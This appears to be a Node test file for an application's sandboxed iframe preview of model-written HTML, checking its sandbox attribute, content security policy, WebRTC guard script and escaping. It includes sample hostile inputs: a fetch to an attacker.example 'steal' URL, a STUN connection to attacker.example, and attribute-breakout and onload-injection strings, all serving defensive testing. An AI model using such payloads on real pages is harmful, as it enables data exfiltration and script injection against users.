import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import test from "node:test";

import {
  HTML_PREVIEW_CDN_HOSTS,
  HTML_PREVIEW_CSP,
  HTML_PREVIEW_GUARD_SCRIPT,
  HTML_PREVIEW_WEBRTC_GLOBALS,
  HTML_PREVIEW_MAX_BYTES,
  HTML_PREVIEW_OUTER_CSP,
  HTML_PREVIEW_SANDBOX,
  buildHtmlPreviewSrcdoc,
  isHtmlPreviewSmallEnough,
  isHtmlPreviewable,
  openDeclarativeShadowRoots,
  withEmbedderNonce,
} from "../lib/htmlArtifactPreview.ts";

/**
 * The isolation of the generated-HTML preview, pinned as strings.
 *
 * These assertions are the contract: a model-written page runs with script,
 * and what keeps it away from the signed-in account is the sandbox attribute
 * and the policy below. Loosening either has to break one of these.
 */

const directives = Object.fromEntries(
  HTML_PREVIEW_CSP.split(";").map((part) => part.trim()).filter(Boolean).map((part) => {
    const [name, ...values] = part.split(/\s+/);
    return [name, values];
  })
);

test("the sandbox grants scripts and nothing else, and above all not the app's origin", () => {
  const tokens = HTML_PREVIEW_SANDBOX.split(/\s+/).filter(Boolean);
  assert.deepEqual(tokens, ["allow-scripts"]);
  for (const forbidden of [
    "allow-same-origin", "allow-top-navigation", "allow-top-navigation-by-user-activation", "allow-top-navigation-to-custom-protocols",
    "allow-popups", "allow-popups-to-escape-sandbox", "allow-forms", "allow-modals", "allow-downloads", "allow-pointer-lock",
    "allow-presentation", "allow-orientation-lock", "allow-storage-access-by-user-activation",
  ]) {
    assert.ok(!tokens.includes(forbidden), forbidden);
  }
});

test("the policy cuts every channel a sandboxed script would have left", () => {
  assert.deepEqual(directives["default-src"], ["'none'"]);
  assert.deepEqual(directives["connect-src"], ["'none'"], "no fetch, XHR, WebSocket or beacon");
  assert.deepEqual(directives["form-action"], ["'none'"], "no form submission");
  assert.deepEqual(directives["base-uri"], ["'none'"], "no <base> to redirect relative URLs");
  assert.deepEqual(directives["frame-src"], ["'none'"], "no nested documents");
  assert.deepEqual(directives["object-src"], ["'none'"]);
  assert.deepEqual(directives["worker-src"], ["'none'"]);
  assert.deepEqual(directives["manifest-src"], ["'none'"]);
});

test("script, style, image and font sources are inline or one of three public CDNs, never a wildcard or a scheme", () => {
  assert.deepEqual([...HTML_PREVIEW_CDN_HOSTS], ["https://cdnjs.cloudflare.com", "https://cdn.jsdelivr.net", "https://unpkg.com"]);
  for (const name of ["script-src", "style-src", "img-src", "font-src"]) {
    for (const value of directives[name]) {
      assert.ok(
        value === "'unsafe-inline'" || value === "data:" || value === "blob:" || HTML_PREVIEW_CDN_HOSTS.includes(value),
        `${name} allows ${value}`
      );
    }
  }
  assert.ok(directives["script-src"].includes("'unsafe-inline'"), "an inline chart script must run");
  assert.ok(!HTML_PREVIEW_CSP.includes("'unsafe-eval'"), "no eval or Function from a string");
  assert.ok(!/(^|\s)\*(\s|;|$)/.test(HTML_PREVIEW_CSP), "no wildcard source");
  assert.ok(!/(^|\s)https?:(\s|;|$)/.test(HTML_PREVIEW_CSP), "no whole-scheme source");
  // Pages may draw with inline images only: no image URL, on a CDN or anywhere else, can carry the page's text out.
  assert.deepEqual(directives["img-src"], ["data:", "blob:"]);
});

const unescape = (value) => value.replace(/&quot;/g, '"').replace(/&amp;/g, "&");
const split = (srcdoc) => {
  const match = /^(<!doctype html><meta http-equiv="Content-Security-Policy" content="([^"]*)"><body[^>]*>)<iframe ([^>]*?) srcdoc="([^"]*)"><\/iframe>$/.exec(srcdoc);
  assert.ok(match, "the preview is one outer document holding one frame: " + srcdoc.slice(0, 200));
  return { outerPolicy: match[2], frameAttributes: match[3], inner: unescape(match[4]) };
};

test("the page lives in a frame inside ours, and the outer document allows no frames, so the page cannot navigate itself away", () => {
  const { outerPolicy, frameAttributes } = split(buildHtmlPreviewSrcdoc("<p>x</p>"));
  assert.equal(outerPolicy, HTML_PREVIEW_OUTER_CSP);
  assert.equal(HTML_PREVIEW_OUTER_CSP, "frame-src 'none'", "only frame-src: a srcdoc child inherits every directive, so nothing else may be added here");
  assert.match(frameAttributes, /sandbox="allow-scripts"/);
  assert.doesNotMatch(frameAttributes, /allow-same-origin|allow-top-navigation|allow-popups|allow-forms/);
  assert.match(frameAttributes, /referrerpolicy="no-referrer"/);
});

test("the page's policy meta is the first element of the inner document, ahead of anything the page says", () => {
  const hostile = `<!-- <head> --><script>fetch("https://attacker.example/steal")</script>`;
  const { inner } = split(buildHtmlPreviewSrcdoc(hostile));
  assert.ok(inner.startsWith(`<!doctype html><meta http-equiv="Content-Security-Policy" content="${HTML_PREVIEW_CSP}">`));
  assert.ok(inner.indexOf("Content-Security-Policy") < inner.indexOf("<script>"));
  assert.ok(inner.endsWith(hostile), "the page is carried exactly as written");
});

test("a page that tries to close the frame attribute or the outer document stays inside the inner srcdoc", () => {
  const hostile = '"></iframe><script>alert(1)</script><iframe srcdoc="';
  const srcdoc = buildHtmlPreviewSrcdoc(hostile);
  const { inner } = split(srcdoc);
  assert.ok(inner.endsWith(hostile));
  // Every quote of the page is escaped, so the attribute cannot be closed from inside: the only quote-then-tag
  // sequence left is the real end of the one wrapper frame (split() matched `[^"]*` up to it).
  assert.equal(srcdoc.split('"><\/iframe>').length - 1, 1);
});

test("the page's own doctype is replaced by ours so the frame does not fall into quirks mode", () => {
  const { inner } = split(buildHtmlPreviewSrcdoc(String.fromCharCode(0xfeff) + '  <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN"><html><body>x</body></html>'));
  assert.equal(inner.match(/<!doctype/gi).length, 1);
  assert.ok(inner.endsWith("<html><body>x</body></html>"));
  // A doctype that is not at the start is the page's content and is left alone.
  assert.equal(split(buildHtmlPreviewSrcdoc("<p>a</p><!doctype html>")).inner.match(/<!doctype/gi).length, 2);
});

test("the policy also declares CSP3's WebRTC switch, which applies the day a browser enforces it", () => {
  assert.deepEqual(directives["webrtc"], ["'block'"]);
});

test("the WebRTC guard runs right after our policy and the DNS-prefetch switch, before anything the page says", () => {
  const hostile = `<script>new RTCPeerConnection({ iceServers: [{ urls: "stun:attacker.example:3478" }] })</script>`;
  const { inner } = split(buildHtmlPreviewSrcdoc(hostile));
  // CSP meta, then the DNS-prefetch meta, then the guard, then the page.
  const head =
    `<!doctype html><meta http-equiv="Content-Security-Policy" content="${HTML_PREVIEW_CSP}">` +
    `<meta http-equiv="x-dns-prefetch-control" content="off">`;
  assert.ok(inner.startsWith(`${head}<script>${HTML_PREVIEW_GUARD_SCRIPT}</script>`));
  assert.ok(inner.endsWith(hostile));
  assert.ok(inner.indexOf(HTML_PREVIEW_GUARD_SCRIPT) < inner.indexOf("new RTCPeerConnection"));
});

test("in the chat the guard carries the embedding document's nonce, or the app's policy would block it", () => {
  const { inner } = split(buildHtmlPreviewSrcdoc("<p>x</p>", null, { nonce: "bm9uY2UtdmFsdWU=" }));
  assert.ok(inner.includes(`<script nonce="bm9uY2UtdmFsdWU=">${HTML_PREVIEW_GUARD_SCRIPT}</script>`));
  // A value that is not a nonce is not written into the attribute.
  for (const bad of ['x" onload="alert(1)', "short", ""]) {
    const { inner: plain } = split(buildHtmlPreviewSrcdoc("<p>x</p>", null, { nonce: bad }));
    assert.ok(plain.includes(`<script>${HTML_PREVIEW_GUARD_SCRIPT}</script>`), bad);
  }
});

test("the guard locks every WebRTC name, media capture and nested frames, with functions it captured first", () => {
  for (const name of [
    "RTCPeerConnection", "webkitRTCPeerConnection", "RTCDataChannel", "RTCSessionDescription", "RTCIceCandidate",
    "RTCRtpSender", "RTCRtpReceiver", "RTCRtpTransceiver", "RTCDtlsTransport", "RTCIceTransport", "RTCSctpTransport",
    "MediaStreamTrack",
  ]) {
    assert.ok(HTML_PREVIEW_WEBRTC_GLOBALS.includes(name), name);
  }
  assert.match(HTML_PREVIEW_GUARD_SCRIPT, /configurable: false/);
  assert.match(HTML_PREVIEW_GUARD_SCRIPT, /\/\^\(webkit\|moz\)\?RTC\//, "every RTC global, not only the listed ones");
  assert.match(HTML_PREVIEW_GUARD_SCRIPT, /mediaDevices/);
  assert.match(HTML_PREVIEW_GUARD_SCRIPT, /iframe,frame,frameset,object,embed/);
  assert.match(HTML_PREVIEW_GUARD_SCRIPT, /contentWindow/);
  // Same text in source, in srcdoc and at runtime, and it cannot end its own element early.
  assert.ok(!HTML_PREVIEW_GUARD_SCRIPT.includes("\\"));
  assert.ok(!/<\/script/i.test(HTML_PREVIEW_GUARD_SCRIPT));
  // It parses as a script.
  assert.doesNotThrow(() => new Function(HTML_PREVIEW_GUARD_SCRIPT));
});

test("the guard follows every shadow root: all are open, and markup parsers that make roots from strings are gone", () => {
  // Each added element and its descendants are entered through the shadowRoot getter captured before the page ran;
  // an open root is watched, swept of frames and entered in turn.
  assert.ok(HTML_PREVIEW_GUARD_SCRIPT.includes('shadowOf = describe(Element.prototype, "shadowRoot").get'));
  assert.ok(HTML_PREVIEW_GUARD_SCRIPT.includes("var root = apply(shadowOf, element, []);"));
  assert.ok(HTML_PREVIEW_GUARD_SCRIPT.includes("apply(observe, observer, [root, watch]);"));
  assert.ok(HTML_PREVIEW_GUARD_SCRIPT.includes("each(apply(selectInRoot, root, [frames]), removeNode);"));
  assert.ok(HTML_PREVIEW_GUARD_SCRIPT.includes('each(apply(selectInRoot, root, ["*"]), enter);'));
  assert.ok(HTML_PREVIEW_GUARD_SCRIPT.includes('enter(node);\n    each(apply(select, node, ["*"]), enter);'));
  // attachShadow reads the options once, makes the root open (a clonable closed root's copy would be out of reach)
  // and follows it; the wrapper itself cannot be replaced.
  const wrapper = HTML_PREVIEW_GUARD_SCRIPT.slice(HTML_PREVIEW_GUARD_SCRIPT.indexOf('"attachShadow", {'));
  assert.ok(wrapper.includes('var options = assign({}, init);\n        options.mode = "open";'));
  assert.ok(wrapper.includes("var root = apply(attach, this, [options]);\n        follow(root);"));
  assert.match(wrapper, /writable: false, enumerable: false, configurable: false/);
  // Every way to parse markup into a declarative shadow root without attachShadow, document.write included.
  for (const [holder, name] of [
    ["Element.prototype", "setHTMLUnsafe"], ["Element.prototype", "setHTML"],
    ["window.Document", "parseHTMLUnsafe"], ["window.Document", "parseHTML"],
    ["Document.prototype", "write"], ["Document.prototype", "writeln"],
    ["ShadowRoot.prototype", "setHTMLUnsafe"], ["ShadowRoot.prototype", "setHTML"],
  ]) {
    assert.ok(HTML_PREVIEW_GUARD_SCRIPT.includes(`[${holder}, "${name}"]`), `${holder}.${name}`);
  }
  // Capture is taken from the prototype too, not only from navigator.mediaDevices.
  for (const name of ["getUserMedia", "getDisplayMedia", "enumerateDevices"]) {
    assert.ok(HTML_PREVIEW_GUARD_SCRIPT.includes(`"${name}"`), name);
  }
  assert.ok(HTML_PREVIEW_GUARD_SCRIPT.includes("lock(window.MediaDevices && window.MediaDevices.prototype, capture[c]);"));
});

test("a closed declarative root in the page's markup is made open, read the way the tokenizer reads a template start tag", () => {
  const OPEN = " shadowrootmode=open ";
  const opened = [
    ['<template shadowrootmode="closed"><p>x</p></template>', `<template${OPEN} shadowrootmode="closed"><p>x</p></template>`],
    // Any case, after a slash, unquoted, single-quoted, other whitespace.
    ["<TEMPLATE/SHADOWROOTMODE=CLOSED>", `<TEMPLATE${OPEN}/SHADOWROOTMODE=CLOSED>`],
    ["<template\n\tShadowRootMode='Closed'>", `<template${OPEN}\n\tShadowRootMode='Closed'>`],
    // A `>` inside a quoted value does not end the tag; nor does a value straight after a quote.
    ['<template title="a>b"shadowrootmode=\'closed\'>', `<template${OPEN} title="a>b"shadowrootmode='closed'>`],
    // A character reference could spell "closed", so it is opened too.
    ['<template shadowrootmode="&#99;losed">', `<template${OPEN} shadowrootmode="&#99;losed">`],
    // The first of two same-named attributes is the one the browser keeps.
    ["<template shadowrootmode=closed shadowrootmode=open>", `<template${OPEN} shadowrootmode=closed shadowrootmode=open>`],
    // A tag the browser parses after a script or an empty comment is read even though its text follows them.
    [`<script>var s="<template title='";</script><template shadowrootmode=closed>x'`, `<script>var s="<template title='";</script><template${OPEN} shadowrootmode=closed>x'`],
    ["<!--><template shadowrootmode=closed>", `<!--><template${OPEN} shadowrootmode=closed>`],
  ];
  for (const [page, expected] of opened) assert.equal(openDeclarativeShadowRoots(page), expected, page);
  // Left exactly as written: open roots, other values, templates without the attribute, other tags, words.
  for (const page of [
    '<template shadowrootmode="open"><style>p{color:red}</style><p>x</p></template>',
    "<template shadowrootmode=open shadowrootmode=closed>",
    '<template shadowrootmode=" closed">',
    "<template><p>no root</p></template>",
    "<templatex shadowrootmode=closed>",
    '<div shadowrootmode="closed"></div>',
    '<template shadowroot="closed">',
    '<template title="shadowrootmode=closed">',
    "<script>const shadowroot = 1; const shadowrootmode = \"shadowrootmode closed\"; host.shadowRoot;</script>",
    "<style>.shadowrootmode::after { content: 'shadowrootmode closed'; }</style><p class=\"shadowrootmode\">shadowrootmode</p>",
  ]) {
    assert.equal(openDeclarativeShadowRoots(page), page, page);
  }
  // The insertion has no quote, so a literal closed tag inside a script string stays a valid string.
  const literal = "<script>var t = \"<template shadowrootmode=closed>\";</script>";
  assert.equal(openDeclarativeShadowRoots(literal), `<script>var t = "<template${OPEN} shadowrootmode=closed>";</script>`);
  assert.doesNotThrow(() => new Function(openDeclarativeShadowRoots("var t = \"<template shadowrootmode=closed>\";")));
});

test("a page built so that every template read runs to its end is still handled in linear time, erring towards open", () => {
  const page = "<template a='".repeat(80_000) + "shadowrootmode";
  const started = Date.now();
  const out = openDeclarativeShadowRoots(page);
  assert.ok(Date.now() - started < 2_000, `${Date.now() - started} ms`);
  assert.ok(out.length > page.length);
  // Only insertions: taking them out gives the page back.
  assert.equal(out.split(" shadowrootmode=open ").join(""), page);
});

test("the root is opened when the frame is built, and the caller's text is left as it was", () => {
  const page = '<div id="host"><template shadowrootmode="closed"><iframe srcdoc="x"></iframe></template></div><p>after</p>';
  const { inner } = split(buildHtmlPreviewSrcdoc(page));
  assert.ok(inner.endsWith('<div id="host"><template shadowrootmode=open  shadowrootmode="closed"><iframe srcdoc="x"></iframe></template></div><p>after</p>'));
  assert.ok(page.includes('<template shadowrootmode="closed">'));
});

test("a policy the page adds cannot widen ours: ours stays first and unmodified", () => {
  const page = `<meta http-equiv="Content-Security-Policy" content="default-src *"><body>hi</body>`;
  assert.ok(split(buildHtmlPreviewSrcdoc(page)).inner.startsWith(`<!doctype html><meta http-equiv="Content-Security-Policy" content="${HTML_PREVIEW_CSP}">`));
});

test("only a ready HTML file within the size limit is previewed", () => {
  assert.equal(isHtmlPreviewable({ format: "html", byteSize: 10, status: "ready" }), true);
  assert.equal(isHtmlPreviewable({ format: "htm", byteSize: 10, status: "ready" }), true);
  assert.equal(isHtmlPreviewable({ format: "HTML", byteSize: 10, status: "ready" }), true);
  for (const format of ["svg", "xml", "js", "md", "pdf", "xlsx", "css", "txt"]) {
    assert.equal(isHtmlPreviewable({ format, byteSize: 10, status: "ready" }), false, format);
  }
  assert.equal(isHtmlPreviewable({ format: "html", byteSize: 10, status: "failed" }), false);
  assert.equal(isHtmlPreviewable({ format: "html", byteSize: 10, status: "blocked" }), false);
  assert.equal(isHtmlPreviewSmallEnough(HTML_PREVIEW_MAX_BYTES), true);
  assert.equal(isHtmlPreviewSmallEnough(HTML_PREVIEW_MAX_BYTES + 1), false);
  assert.equal(isHtmlPreviewSmallEnough(Number.NaN), false);
  assert.equal(isHtmlPreviewSmallEnough(-1), false);
});

test("the embedder's nonce goes on the page's script, style and stylesheet elements, by the browser parser, and only when it is a plain token", () => {
  const touched = [];
  let asked = null;
  const parse = () => ({
    querySelectorAll: (selector) => { asked = selector; return [1, 2, 3].map((n) => ({ setAttribute: (name, value) => touched.push([n, name, value]) })); },
    documentElement: { outerHTML: "<html>rewritten</html>" },
  });
  assert.equal(withEmbedderNonce("<p>x</p>", "abc123def456", parse), "<html>rewritten</html>");
  assert.match(asked, /script/);
  assert.match(asked, /style/);
  assert.match(asked, /link/);
  assert.deepEqual(touched.map(([, name, value]) => [name, value]), Array(3).fill(["nonce", "abc123def456"]));
  // No nonce on the embedding page, or one that could break out of an attribute: the page is untouched.
  for (const nonce of [null, undefined, "", "short", "abc\" onload=\"x", "a b c d e f g h", "x".repeat(300)]) {
    assert.equal(withEmbedderNonce("<p>x</p>", nonce, () => { throw new Error("must not parse"); }), "<p>x</p>");
  }
});

test("the frame switches off DNS prefetching ahead of the page, after our policy", () => {
  const { inner } = split(buildHtmlPreviewSrcdoc("<p>x</p>"));
  const policy = inner.indexOf("Content-Security-Policy");
  const prefetch = inner.indexOf('http-equiv="x-dns-prefetch-control" content="off"');
  assert.ok(policy >= 0 && prefetch > policy, "ours is the second element");
  assert.ok(prefetch < inner.indexOf("<p>x</p>"));
});

// Review r-20261128-054317-1a725b: the parent document does not parse or rewrite the
// model's HTML to deal with resource hints. A CSP cannot stop them and a pattern over
// HTML is bypassed; they are a known residual risk, covered by the frame's own policy
// and x-dns-prefetch-control only.
test("the parent document never parses or rewrites the model's HTML for resource hints", () => {
  const read = (path) => readFileSync(new URL(path, import.meta.url), "utf8");
  // The panel draws the frame through HtmlArtifactPreviewFrame, which builds the srcdoc.
  const panel = read("../components/chat/HtmlArtifactPreviewPanel.tsx");
  const frame = read("../components/chat/HtmlArtifactPreviewFrame.tsx");
  const lib = read("../lib/htmlArtifactPreview.ts");
  // Code only: a comment that names an API is not a use of it.
  const code = (source) => source.replace(/\/\*[\s\S]*?\*\//g, "").replace(/^\s*\/\/.*$/gm, "");
  for (const source of [panel, frame, lib]) assert.ok(!source.includes("stripPreviewResourceHints"));
  assert.ok(!lib.includes("RESOURCE_HINT_SELECTOR"));
  // The one parse that remains is the embedder-nonce rewrite, which existed before and runs only when
  // the embedding document has a nonce; nothing else touches the page as markup.
  assert.equal((panel + frame).split("new DOMParser()").length - 1, 1);
  assert.ok(frame.includes("withEmbedderNonce(html, nonce, (text) => new DOMParser()"));
  for (const source of [panel, frame, lib]) {
    assert.doesNotMatch(code(source), /innerHTML|insertAdjacentHTML|document\.write|createContextualFragment/);
  }
  // No pattern over the page's markup for resource hints in the build step either.
  assert.doesNotMatch(lib, /\.replace\([^)]*<link/i);
  // The one text change to the page is opening closed declarative roots (an insertion, no parse), made where the
  // frame is built.
  assert.equal(code(lib).split("openDeclarativeShadowRoots(html.replace(LEADING_DOCTYPE").length - 1, 1);
});
